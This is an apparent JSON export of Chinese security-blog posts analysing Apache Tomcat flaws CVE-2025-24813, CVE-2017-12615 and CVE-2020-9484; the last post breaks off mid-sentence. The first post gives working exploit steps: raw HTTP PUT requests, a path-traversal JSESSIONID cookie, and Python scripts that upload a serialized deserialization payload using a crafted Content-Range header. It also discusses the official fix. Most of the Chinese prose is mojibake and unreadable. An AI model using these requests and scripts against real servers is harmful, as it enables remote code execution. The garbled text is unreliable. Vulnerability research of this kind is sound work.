[{"content":"Apache Tomcat partial PUTæ–‡ä»¶ä¸Šä¼ ååºåˆ—åŒ–æ¼æ´ ä»Šå¹´å¹´åˆä¸‰æœˆä»½çˆ†å‡ºæ¥çš„CVE-2025-24813ï¼ŒApache Tomcat partial PUTæ–‡ä»¶ä¸Šä¼ ååºåˆ—åŒ–æ¼æ´ã€‚ç®—æ˜¯ä¸€ä¸ªç»“åˆäº†tomcatå†å²cveçš„ä¸€ä¸ªæ¼æ´ï¼Œè¿™é‡Œç‰¹æ­¤æ¥å¤ç°ä¸€ä¸‹ã€‚\næ¼æ´ç‰ˆæœ¬ï¼š\n11.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt; 11.0.3 10.1.0-M1 \u0026lt;= Apache Tomcat \u0026lt; 10.1.35 9.0.0.M1 \u0026lt;= Apache Tomcat \u0026lt; 9.0.99 æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š\nç®—æ˜¯èåˆtomcatçš„CVE-2017-12615å’ŒCVE-2020-9484ç„¶åæƒ³å‡ºæ¥çš„ä¸€ä¸ªæ–°çš„åˆ©ç”¨æ–¹å¼ã€‚æ•…åˆ©ç”¨æ¡ä»¶éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œç›®æ ‡ç¯å¢ƒéœ€è¦æ»¡è¶³å¦‚ä¸‹å‡ ä¸ªéœ€æ±‚ï¼š\nreadOnlyä¸ºfalseï¼ˆä¹Ÿå°±æ˜¯å¼€å¯putã€deleteè¯·æ±‚æ–¹æ³•æ¥æ“ä½œæ–‡ä»¶ï¼Œé»˜è®¤ä¸ºtrueï¼‰ æœåŠ¡å™¨PersistenceManageré…ç½®ä¸­ä½¿ç”¨äº†FileStore ç›®æ ‡ç¯å¢ƒå­˜åœ¨å¯ä¾›ååºåˆ—åŒ–çš„ç±»ã€‚ å…³äºCVE-2017-12615å’ŒCVE-2020-9484çš„åˆ†æï¼Œå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„æ–‡ç« ï¼š\nã€ŠTomcat PUTæ–‡ä»¶ä¸Šä¼ å’ŒSession ååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´åˆ†æã€‹\nå­¦ä¹ äº†è¿™ä¸¤ä¸ªæ¼æ´åï¼Œå¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“ï¼Œåœ¨é…ç½®ä¸å½“ä¸‹ï¼Œæ˜¯å¦å¯ä»¥ç”¨putæ–‡ä»¶ä¸Šä¼ æ¥è§£å†³sessionååºåˆ—åŒ–éœ€è¦çš„ç›®æ ‡ç¯å¢ƒéœ€è¦å­˜åœ¨æ–‡ä»¶çš„éš¾ç‚¹å‘¢ï¼Ÿå¦‚ä¸‹ä»åŸç†åˆ°å¤ç°å¼€å§‹ä¸€æ­¥ä¸€æ­¥åˆ†æï¼Œtomcatç¯å¢ƒä¸º9.0.35ï¼Œjdkä¸º8u71ã€‚\nç¯å¢ƒæ­å»ºåŠæ”»å‡»æµç¨‹åˆ†æ åœ¨ideaä¸Šæ­å»ºtomcatç¯å¢ƒï¼Œç„¶åä¿®æ”¹/conf/web.xmlæ–‡ä»¶å†…å®¹ï¼š\nå°±æ˜¯åœ¨åŸé…ç½®ä¸Šæ‰“å¼€äº†putæ–‡ä»¶ä¸Šä¼ çš„æƒé™ã€‚ç„¶åä¿®æ”¹conf/context.xmlæ–‡ä»¶å†…å®¹ï¼š\næ·»åŠ å¦‚å›¾éƒ¨åˆ†å³å¯ã€‚å…¶å®å°±æ˜¯å°†ä¸¤ä¸ªCVEçš„ä¸å½“é…ç½®éƒ½ç»“åˆèµ·æ¥ï¼Œç„¶åç»“åˆèµ·æ¥æ‰“ã€‚\nputæ–‡ä»¶ä¸Šä¼ åˆ†æ é¦–å…ˆéœ€è¦ææ‡‚ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦putæ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ äº†çš„æ–‡ä»¶æ˜¯å¹²ä»€ä¹ˆï¼Œç»“åˆä¸¤ä¸ªcveæ¥è¯´ï¼Œå¯ä»¥ç®€å•åœ°è®¤ä¸ºå¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åˆ°webç›®å½•ä¸‹ï¼Œå¹¶ä¸”å°†æ–‡ä»¶åç¼€è®¾ç½®ä¸ºsessionï¼Œç„¶åå†è°ƒç”¨FileStoreæ¥ç›®å½•ç©¿è¶ŠåŠ è½½å¯¹åº”çš„æ–‡ä»¶ï¼Œæ•…éœ€è¦tomcatæ˜¯åœ¨å­˜åœ¨sessionååºåˆ—åŒ–æ¼æ´çš„ç‰ˆæœ¬ä¸­ï¼Œè¿™é‡Œå°è¯•ä½¿ç”¨tomcat9.0.20å¹¶ä¸”å¯¹åŸå…ˆçš„putæ–‡ä»¶ä¸Šä¼ çš„é“¾è·¯è¿›è¡Œåˆ†æï¼š\nä»ç†è®ºä¸Šæ¥è¯´ï¼Œå¦‚ä¸‹æ‰“å³å¯ï¼š\nputæ–‡ä»¶ä¸Šä¼ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 PUT /tomcat7_0_79_Web_exploded/ser.session HTTP/1.1 Host: 192.168.153.178:8087 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Length: 67 {{ååºåˆ—åŒ–æ–‡ä»¶å†…å®¹}} sessionååºåˆ—åŒ–åŠ è½½ï¼š\n1 2 3 4 5 6 7 8 9 10 GET /tomcat9_0_35_Web_exploded/ HTTP/1.1 Host: 192.168.153.178:8083 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Cookie: JSESSIONID=../../../../../../../../../../Desktop/java_learn/javaweb project/tomcat9.0.20/out/artifacts/tomcat9_0_20_Web_exploded/ser Upgrade-Insecure-Requests: 1 Priority: u=0, i è¿™é‡Œç›®å½•ç©¿è¶Šçš„ä¸ªæ•°è¯´æ˜ä¸€ä¸‹ï¼Œåœ¨å‰é¢çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“sessionæ–‡ä»¶åŠ è½½çš„ç›®å½•ä¸putæ–‡ä»¶ä¸Šä¼ çš„ç›®å½•åˆ†åˆ«ä¸ºï¼š\n1 2 3 4 /Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/1e112f7e-49f1-4f6d-8404-dc4563d75f0c/work/Catalina/localhost/tomcat9_0_20_Web_exploded/ /Users/xxxxxxxx/Desktop/java_learn/javaweb project/tomcat9.0.20/out/artifacts/tomcat9_0_20_Web_exploded/ser æ•…è¿™é‡Œç©¿äº†åä¸ªåˆ°xxxxxxxxç›®å½•ä¸‹ï¼Œç„¶åå†è¿›è¡ŒåŠ è½½ï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨tomcatä¸­åº”è¯¥ä¸ç”¨ç©¿è¿™ä¹ˆå¤šå±‚ï¼ˆå¦‚æœä½¿ç”¨/bin/start.upå¼€å¯çš„tomcatï¼‰ï¼Œåªç”¨å¦‚ä¸‹ç©¿å³å¯ï¼š\n1 ../../../../webapps/tomcat9_0_20_Web_exploded/ser å› ä¸ºä»tomcatæºç æ¥çœ‹ï¼Œwebappsç›®å½•å’Œworkç›®å½•æ˜¯åŒç›®å½•çš„ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„ideaé…åˆtomcatï¼Œæœ‰å·®åˆ«ï¼Œæ•…æ­£å¸¸ç¯å¢ƒåº”è¯¥æ˜¯åƒä¸Šè¿°é‚£æ ·ç©¿ï¼ˆç†è®ºä¸Šï¼Œæ²¡æ­ç¯å¢ƒå»è¯•ï¼‰\næœ€åå°è¯•æ”»å‡»å¦‚ä¸‹ï¼š\nä½¿ç”¨pythonè„šæœ¬æ¥ä¸Šä¼ æ‰“cc5ååºåˆ—åŒ–çš„æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import requests url = \u0026#34;http://url/tomcat9_0_20_Web_exploded/ser.session\u0026#34; local_file = \u0026#34;ser.session\u0026#34; with open(local_file, \u0026#34;rb\u0026#34;) as f: file_data = f.read() resp = requests.put(url, data=file_data, headers={ \u0026#34;Content-Type\u0026#34;: \u0026#34;application/octet-stream\u0026#34; }) print(\u0026#34;çŠ¶æ€ç :\u0026#34;, resp.status_code) å›æ˜¾201æˆåŠŸåˆ›å»ºï¼Œåœ¨webç›®å½•æ‰¾åˆ°æ–‡ä»¶ï¼š\nç„¶åç›´æ¥æ‰“åŠ è½½sessionæ–‡ä»¶ï¼š\næ‰“ä¸é€šï¼Œåé¢ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œcookieä¸­çš„javaweb projectä¸­æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œå¯¼è‡´ä¸èƒ½æ­£å¸¸è·å–åˆ°cookieä¸­è®¾ç½®çš„JSESSIONIDçš„å€¼ã€‚å”‰ğŸ˜®â€ğŸ’¨ï¼Œå› æ­¤åˆæ­å»ºäº†ä¸€ä¸ªé¡¹ç›®æ¥è¿›è¡Œå¤ç°ï¼Œè¿˜æ˜¯å…ˆputä¸Šä¼ æ–‡ä»¶ï¼Œæœ€åæˆåŠŸåŠ è½½æ–‡ä»¶è¾¾åˆ°ååºåˆ—æ”»å‡»ï¼š\næ³¨æ„libä¸­çš„ccä¾èµ–éœ€è¦å­˜åœ¨ã€‚\nç”±æ­¤æˆåŠŸå®ç°äº†ä¸€æ¬¡putæ–‡ä»¶ä¸Šä¼ +sessionåŠ è½½æ–‡ä»¶åˆ°è¾¾ååºåˆ—åŒ–æ”»å‡»ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\næœ€åæ¥çœ‹ä¸€ä¸‹tomcaté«˜ç‰ˆæœ¬å¯¹putæ–‡ä»¶ä¸Šä¼ çš„ä¿®å¤ï¼Œåœ¨å†™å…¥æ–‡ä»¶å‰å¯¹è·¯å¾„è¿›è¡Œäº†æ ¡éªŒï¼š\nç›´æ¥è¿”å›falseå¯¼è‡´ä¸èƒ½ç»§ç»­å†™å…¥ï¼Œæ­¤æ—¶çš„è°ƒç”¨æ ˆä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 write:222, DirResourceSet (org.apache.catalina.webresources) write:184, StandardRoot (org.apache.catalina.webresources) doPut:590, DefaultServlet (org.apache.catalina.servlets) service:663, HttpServlet (javax.servlet.http) service:435, DefaultServlet (org.apache.catalina.servlets) service:741, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:53, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:200, StandardWrapperValve (org.apache.catalina.core) invoke:96, StandardContextValve (org.apache.catalina.core) invoke:490, AuthenticatorBase (org.apache.catalina.authenticator) invoke:139, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:678, AbstractAccessLogValve (org.apache.catalina.valves) invoke:74, StandardEngineValve (org.apache.catalina.core) service:343, CoyoteAdapter (org.apache.catalina.connector) service:408, Http11Processor (org.apache.coyote.http11) process:66, AbstractProcessorLight (org.apache.coyote) process:836, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1839, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1142, ThreadPoolExecutor (java.util.concurrent) run:617, ThreadPoolExecutor$Worker (java.util.concurrent) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:745, Thread (java.lang) â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\né‚£ä¹ˆæ›´é«˜ç‰ˆæœ¬çš„tomcatå‘¢ï¼Œè¯¥æ€ä¹ˆæ‰“ï¼Œé™åˆ¶äº†ç›®å½•ç©¿è¶Šï¼Œå‰é¢çš„æ”»å‡»æ–¹æ³•è‚¯å®šå°±ä¸èƒ½ç”Ÿæ•ˆäº†ï¼Œç„¶è€Œï¼Œåœ¨putæ–‡ä»¶ä¸Šä¼ çš„åœ°æ–¹ï¼Œåˆç©å‡ºäº†æ–°èŠ±æ ·ï¼Œåœ¨tomcat9.0.35ä¸‹è¿›è¡Œåˆ†æï¼Œè·Ÿè¿›DefaultServletç±»çš„doPut()æ–¹æ³•ï¼š\nè·Ÿè¿›parseContentRange()æ–¹æ³•ï¼š\næ£€æµ‹è¯·æ±‚åŒ…ä¸­æ˜¯å¦æœ‰Content-Rangeè¯·æ±‚å¤´ï¼Œæ²¡æœ‰çš„è¯å°±è¿”å›Rangeå®ä¾‹ï¼š\nä¹Ÿå°±ä¼šè¿›å…¥åˆ°å‰é¢é¢„æœŸçš„æ–¹æ³•ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶æ”¾åˆ°webç›®å½•ä¸­ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡æ§åˆ¶è¯·æ±‚å¤´Content-Rangeçš„é•¿åº¦æ¥å®ç°æ–‡ä»¶ä¸Šä¼ ï¼ˆå…¶å®è¿™ä¹Ÿæ˜¯tomcatä¸“é—¨è¢«è®¾è®¡è¦å®ç°çš„ç”¨äºå¤§æ–‡ä»¶åˆ†å—ä¸Šä¼ åŠŸèƒ½ç‚¹ï¼‰ï¼Œç»§ç»­çœ‹ä»£ç ï¼š\nè¦æ±‚å¼€å¯partial putï¼Œç„¶åè°ƒç”¨ContentRange.parse()æ–¹æ³•è§£æå‚æ•°å¹¶ä¸”åªæ¥å—byteç±»å‹çš„ï¼Œç„¶åä¿å­˜é•¿åº¦å°å­˜è¿›rangeå¯¹è±¡ä¸­ï¼Œæœ€åè¿”å›äº†è¿™ä¸ªrangeå¯¹è±¡ã€‚å›é€€å‡ºparseContentRange()æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›ï¼š\nä¼šè¿›å…¥elseè¯­å¥ï¼Œä¼šè°ƒç”¨executePartialPut()æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„æ–¹æ³•ï¼Œå®ç°äº†å¯¹æ–‡ä»¶çš„å†™å…¥ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š\nè¿™é‡Œnew File()äº†ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œè·å–çš„æ˜¯TEMPDIRæŒ‡å‘çš„è·¯å¾„ï¼š\nå¯ä»¥å†™ä¸€ä¸ªjspæ–‡ä»¶æ¥è·å–ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% out.println(request.getServletContext().getAttribute(ServletContext.TEMPDIR)); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è®¿é—®æ‹¿åˆ°è·¯å¾„ï¼š\n1 /Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/c95d0ef3-f2a9-4529-9363-81226b1de81c/work/Catalina/localhost/tomcat9_0_35_Web_exploded è¿™ä¸€çœ‹ä¸å°±æ˜¯æŒä¹…åŒ–sessionå­˜å‚¨æ–‡ä»¶çš„åœ°æ–¹å—ï¼Œå¹¶ä¸”å…¶å®è·Ÿè¿›FileStoreçš„load()æ–¹æ³•ï¼Œå…¶è°ƒç”¨çš„file()æ–¹æ³•ä¸­çš„å…³é”®è°ƒç”¨çš„directory()æ–¹æ³•ï¼Œå…¶å®šä¹‰äº†æ–‡ä»¶å­˜å‚¨çš„è·¯å¾„ï¼Œè·Ÿè¿›å¦‚ä¸‹ï¼š\nå¾ˆæ˜æ˜¾äº†å§ï¼Œè¿™é‡Œçš„directoryå°±æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶è®¾ç½®ï¼Œä¸è®¾ç½®ä¹Ÿæ²¡é—®é¢˜ï¼Œå…¶æ¬¡ä¹Ÿæ˜¯é€šè¿‡servletContext.getAttribute(ServletContext.TEMPDIR)æ¥è·å–çš„è·¯å¾„ï¼Œè¿™ä¹Ÿæ˜¯å’Œå‰é¢ä¸€æ¨¡ä¸€æ ·çš„ã€‚\nå†å›åˆ°DefaultServeltç±»çš„executePartialPut()æ–¹æ³•ï¼Œåœ¨è·å–åˆ°å­˜å‚¨è·¯å¾„ä¹‹åï¼Œå¯¹pathè¿›è¡Œäº†æ›¿æ¢ï¼Œå°†/æ›¿æ¢ä¸º.ï¼Œæ¯”å¦‚æˆ‘é€šè¿‡è®¾ç½®uriä¸º/ser/sessionï¼Œé‚£ä¹ˆè¿™é‡Œæ›¿æ¢åå°±æ˜¯.ser.sessionï¼Œæ­£å¥½ä¹Ÿæ˜¯ç¬¦åˆ.sessionæ–‡ä»¶ã€‚\nå†ç»§ç»­çœ‹ï¼Œç„¶ååº”è¯¥å°±æ˜¯ä¼šå°†è¯·æ±‚æµä¸­çš„æ•°æ®å†™å…¥åˆ°contentFileä¸­äº†ï¼š\næœ€åå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”\nç”±æ­¤é“¾è·¯æ¸…æ™°ï¼Œé€šè¿‡æ§åˆ¶Content-Rangeè¯·æ±‚å¤´ï¼Œå†™å…¥æ–‡ä»¶åˆ°æŒä¹…åŒ–sessionå­˜å‚¨æ–‡ä»¶çš„åœ°æ–¹ï¼Œç„¶åç›´æ¥åŠ è½½å³å¯ï¼Œä¸éœ€è¦ä½¿ç”¨../æ¥è¿›è¡Œç›®å½•ç©¿è¶Šã€‚\næ”»å‡»å¤ç° è¿˜æ˜¯ååºåˆ—åŒ–æ‰“cc5ï¼Œä½¿ç”¨pythonè„šæœ¬ä¸Šä¼ æ–‡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import requests url = \u0026#34;http://192.168.153.178:8083/tomcat9_0_35_Web_exploded/ser/session\u0026#34; local_file = \u0026#34;ser.session\u0026#34; with open(local_file, \u0026#34;rb\u0026#34;) as f: file_data = f.read() file_size = len(file_data) # Content-Range: bytes=0-(size-1)/size headers = { \u0026#34;Content-Range\u0026#34;: f\u0026#34;bytes=0-{file_size-1}/{file_size}\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/octet-stream\u0026#34; } resp = requests.put(url, data=file_data, headers=headers) print(\u0026#34;çŠ¶æ€ç :\u0026#34;, resp.status_code) å›æ˜¾409çŠ¶æ€ç ã€‚\nç„¶åç›´æ¥æ‰“åŠ è½½å³å¯ï¼š\næˆåŠŸè°ƒç”¨ååºåˆ—åŒ–ã€‚å¹¶ä¸”å†æ¬¡è°ƒè¯•ä¹Ÿæ˜¯ç¬¦åˆå‰é¢åˆ†æçš„è¿‡ç¨‹çš„ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\nä¸€äº›éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š\nConten-Rangeçš„åŸºæœ¬æ ¼å¼ä¸ºï¼š\n1 Content-Range: bytes \u0026lt;start\u0026gt;-\u0026lt;end\u0026gt;/\u0026lt;total\u0026gt; ä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„åœ¨è§£æContent-Rangeçš„å€¼è¦ç¬¦åˆtomcatä¸­å®šä¹‰çš„æ ¼å¼ï¼š\nè·Ÿè¿›parse()æ–¹æ³•ï¼š\nè¦æ±‚äº†æ ¼å¼ï¼Œæ•…éœ€è¦ä½¿ç”¨å¦‚ä¸‹çš„æ ¼å¼ï¼š\n1 Content-Range: bytes=\u0026lt;start\u0026gt;-\u0026lt;end\u0026gt;/\u0026lt;length\u0026gt; å…¶æ¬¡è¿˜æ˜¯è¦æ³¨æ„ç›®æ ‡ç¯å¢ƒæ˜¯å¦æœ‰å¯ä¾›æ‰“ååºåˆ—åŒ–çš„ç±»ã€‚\næ€»ç»“ é™åˆ¶æ¡ä»¶æ›´å¤šäº†ï¼Œç®—æ˜¯ä¸¤ä¸ªCVEçš„ç»“åˆä½“ï¼Œä½†æ˜¯è¿˜æ˜¯æ‰¾åˆ°äº†ä¸åŒçš„ä¸€æ¡è·¯ã€‚é‡ç‚¹è¿˜æ˜¯å¯¹ä»£ç è°ƒç”¨çš„ç†è§£ä»¥åŠå¯¹ä»£ç å—åŠŸèƒ½å®ç°çš„åˆ†æã€‚\nå¦‚ä½•ä¿®å¤ï¼Ÿ\nå½“ç„¶è¿˜æ˜¯å¼€å¯readonlyï¼Œè¿™ç§é…ç½®å®Œå…¨æ²¡æœ‰å¿…è¦å¼€ç€å§ã€‚ä»£ç å±‚é¢å¦‚ä½•é™åˆ¶å‘¢ï¼Œåœ¨putæ–‡ä»¶ä¸Šä¼ æ—¶åŠ ä¸€ä¸ªä¸å…è®¸sessionåç¼€ï¼ŸæŠ‘æˆ–æ˜¯åœ¨load()åŠ è½½æ–‡ä»¶æ—¶ä¸å…è®¸åŠ è½½æ–‡ä»¶åä»¥.å¼€å¤´ã€‚çœ‹äº†ä¸€ä¸‹å®˜æ–¹çš„ä¿®å¤é€»è¾‘ï¼š\næ¥åˆ°DefaultServletç±»çš„executePartialPut()æ–¹æ³•ï¼š\nç®—æ˜¯ç›´æ¥é™åˆ¶æ­»äº†ï¼Œè¿™é‡Œç›´æ¥ä¸ç”¨ä½ çš„pathäº†ï¼Œè®©ä½ è¿æ–‡ä»¶åéƒ½æ‘¸ä¸åˆ°ï¼Œè·Ÿè¿›File.createTempFile()æ–¹æ³•ï¼ˆæ³¨æ„è¿™é‡Œå°†suffixè®¾ç½®ä¸ºäº†nullï¼‰ï¼š\nç›´æ¥é™åˆ¶æ–‡ä»¶åç¼€ä¸º.tmpï¼Œåˆ«æƒ³ç”¨.sessionåç¼€ï¼Œç„¶åè¿˜è°ƒç”¨äº†TempDirectory.generateFile()æ¥éšæœºç”Ÿæˆæ–‡ä»¶åï¼š\nä¼¼ä¹è¿˜åœ¨File.createTempFile()ä¸­è°ƒç”¨checkWrite()æ–¹æ³•è¿›è¡Œäº†é‰´æƒã€‚\nè€ŒFileStoreç±»çš„load()æ–¹æ³•ä¼¼ä¹è¿˜æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ã€‚\nè¿™ä¿®å¤æ–¹å¼ç»äº†ï¼Œå­¦åˆ°äº†ï¼Œè¿™æ ·å¤–éƒ¨å°±ä¸ä¼šçŸ¥é“æ–‡ä»¶åç§°ä»¥åŠæ— æ³•æ§åˆ¶æ–‡ä»¶åç¼€ä¸º.sessionã€‚\n","date":"2025-09-28T18:26:31+08:00","permalink":"https://fupanc-w1n.github.io/p/apache-tomcat-partial-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"Apache Tomcat partial PUTæ–‡ä»¶ä¸Šä¼ ååºåˆ—åŒ–æ¼æ´"},{"content":"Tomcat PUTæ–‡ä»¶ä¸Šä¼ å’ŒSession ååºåˆ—åŒ–ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ æ¥åˆ†æä¸€ä¸‹CVE-2017-12615å’ŒCVE-2020-9484ã€‚\nPutæ–‡ä»¶ä¸Šä¼ æ¼æ´ åˆ†æä¸€ä¸‹CVE-2017-12615ã€‚\næ¼æ´ç‰ˆæœ¬ï¼š\nTomcat 7.0.0 to 7.0.79 ä¼¼ä¹ç›´åˆ°tomcat9ä¹Ÿæ˜¯å­˜åœ¨çš„ï¼ˆä¸»è¦æ˜¯æœ¬æ–‡ä¸­æåˆ°çš„/ç»•è¿‡æ–¹å¼å¯ç”¨ï¼‰ã€‚\næ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š\nreadonlyè®¾ç½®ä¸ºfalseï¼Œå…è®¸ä½¿ç”¨putæ–‡ä»¶ä¸Šä¼ ã€‚ æ¥è°ƒè¯•åˆ†æä¸€ä¸‹è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨ç‚¹ã€‚\nç¯å¢ƒæ­å»ºåŠå¤ç° ä¸‹è½½tomcat7.0.79å¹¶åœ¨ideaä¸Šæ­å»ºå¥½ç¯å¢ƒï¼Œjdkç‰ˆæœ¬ä¸º8u71ã€‚\nå…ˆæ¥çœ‹ä¸€ä¸ªåŸºæœ¬çŸ¥è¯†ï¼Œåœ¨tomcatæºç ç›®å½•çš„/conf/web.xmlä¸­ï¼Œå®šä¹‰äº†å¯¹httpè¯·æ±‚çš„å¤„ç†ç±»ï¼š\nDefaultServletç±»ï¼š è¿™æ˜¯ä¸€ä¸ªæ‰€æœ‰webåº”ç”¨ç¨‹åºçš„é»˜è®¤servletï¼Œå®ƒæä¾›é™æ€æœåŠ¡èµ„æºã€‚\nJspServletç±»ï¼š æ˜¯ä¸€ä¸ªå¤„ç†jspåç¼€çš„servletç±»ã€‚\næ˜ å°„æƒ…å†µå¦‚ä¸‹ï¼š\nurlä¸­çš„.jspå’Œ.jspxä¼šäº¤ç»™DefaultServletç±»å¤„ç†ï¼Œå…¶ä½™çš„å°±äº¤ç»™DefaultServletç±»å¤„ç†ã€‚\næ­å»ºæ¼æ´ç¯å¢ƒçš„è¯å°±åŠ ä¸€ä¸ªè®¾ç½®readonlyä¸ºfalseå³å¯ï¼š\nç„¶åå°±å¯ä»¥å¯åŠ¨ç¯å¢ƒäº†å¼€æ‰“äº†ã€‚ä½¿ç”¨putåˆ›å»ºæ–‡ä»¶ï¼š\nå¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šä¼ ï¼Œç„¶åå†è®¿é—®å°±å¯ä»¥æ‰“å‘½ä»¤æ‰§è¡Œäº†ï¼š\nâ€”â€”â€”â€”â€”â€”â€”â€”\nåŸç†åˆ†æ tomcatå¯¹putä¸­çš„jspæ–‡ä»¶ä¸Šä¼ æœ‰é™åˆ¶ï¼Œæ•…è¿™é‡Œéœ€è¦æƒ³æ–¹æ³•è°ƒç”¨åˆ°DefaultServletæ¥è¿›è¡Œå¤„ç†ã€‚\nåœ¨linuxä¸­å¯ä»¥å¦‚å›¾åœ¨æ–‡ä»¶åé¢åŠ ä¸€ä¸ª/ï¼Œè€Œåœ¨windowsç¯å¢ƒä¸­è¿˜å¯ä»¥ä½¿ç”¨ç©ºæ ¼ï¼ˆ%20ï¼‰æˆ–è€…::$DATAæ¥ç»•è¿‡è¿›å…¥JspServletã€‚\næ‰“æ–­ç‚¹äºDefaultServletç±»çš„doPut()æ–¹æ³•ï¼š\nåœ¨é…ç½®æ–‡ä»¶ä¸­æˆ‘ä»¬å°†readOnlyè®¾ç½®ä¸ºfalseäº†ï¼Œæ•…è¿™é‡Œä¸ä¼šè°ƒç”¨sendError()æŠ›å‡ºé”™è¯¯ï¼Œä¸‹é¢çš„getRelativePath(req)å°±æ˜¯è·å–uriä¸­çš„å»æ‰å·¥ç¨‹åçš„å…¶ä½™éƒ¨åˆ†ã€‚\nå†åé¢çš„resources.lookup(path)æ–¹æ³•ç®€å•è·Ÿè¿›å°±æ˜¯çœ‹ç¯å¢ƒä¸­æ˜¯å¦æœ‰è¿‡è¿™ä¸ªçš„ç¼“å­˜ï¼Ÿä»ç»“æœæ¥çœ‹å°±æ˜¯ä¹‹å‰åŠ è½½è¿‡å°±ä¸ºtrueï¼Œå¦åˆ™å°±è¿›å…¥catchå°†existsè®¾ç½®ä¸ºfalseï¼Œè¿™ä¸ªå˜é‡åœ¨åç»­è¿˜æ˜¯æ¯”è¾ƒé‡è¦çš„ã€‚\nç»§ç»­å¾€åé¢çœ‹ï¼š\nè¿™é‡Œæ¯”è¾ƒé‡è¦çš„å°±æ˜¯è°ƒç”¨è¿‡çš„parseContentRange()æ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°æ˜¯ä»è¯·æ±‚å¤´ä¸­æ‰¾Content-Rangeï¼Œä¸å­˜åœ¨å°±ç›´æ¥è¿”å›nullï¼Œå¦åˆ™å°±ä¼šæ ¹æ®ä¼ çš„å‚æ•°æ¥æˆªå–æ–‡ä»¶ä¸Šä¼ çš„å†…å®¹ï¼ˆè¿™ä¹Ÿæ˜¯CVE-2025-24813çš„åˆ©ç”¨ç‚¹ï¼‰ï¼Œä½†æ˜¯è¿™é‡Œä¸æ¶‰åŠï¼Œç›´æ¥çœ‹æ—¢å®šçš„é“¾è·¯ã€‚\nparseContentRange()è¿”å›nullåï¼Œå°±ä¼šç»™rangeèµ‹å€¼ä¸ºnullï¼Œä»è€Œè¿›å…¥elseè¯­å¥æ¥å—å…¨éƒ¨çš„ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ã€‚å†å¾€åçœ‹ï¼š\nå¦‚æœä¹‹å‰åŠ 